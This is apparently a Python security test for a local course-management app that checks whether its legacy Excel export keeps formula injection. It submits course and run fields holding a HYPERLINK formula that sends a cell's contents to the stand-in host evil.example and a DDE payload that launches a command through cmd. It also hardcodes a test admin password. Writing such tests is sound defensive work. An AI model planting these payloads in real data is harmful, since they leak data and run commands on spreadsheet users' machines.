import os, sys
from lib import Client
from openpyxl import load_workbook
import io
a = Client("http://127.0.0.1:18701"); a.login("qaadmin", "Qa-Admin-Pass-9137!x")
r = a.post("/courses", json={"name": '=HYPERLINK("http://evil.example/?"&A1,"x")', "name_fa": "@SUM(1+1)*cmd|' /C calc'!A0", "category": "Soft Skill"})
print("create course with formula-like name:", r.status_code)
cid = r.json()["id"]
r = a.post("/runs", json={"course_id": cid, "institute": "+1+1", "start_date": "2026-12-01", "end_date": "2026-12-02", "days": "-2+3", "time": "=1+1"}); print("run:", r.status_code, r.text[:100])
r = a.get("/export/legacy.xlsx"); wb = load_workbook(io.BytesIO(r.content))
n = 0
for ws in wb.worksheets:
    for row in ws.iter_rows():
        for c in row:
            if c.data_type == "f":
                n += 1; print("FORMULA CELL:", ws.title, c.coordinate, repr(c.value)[:70])
print("formula cells in export:", n)
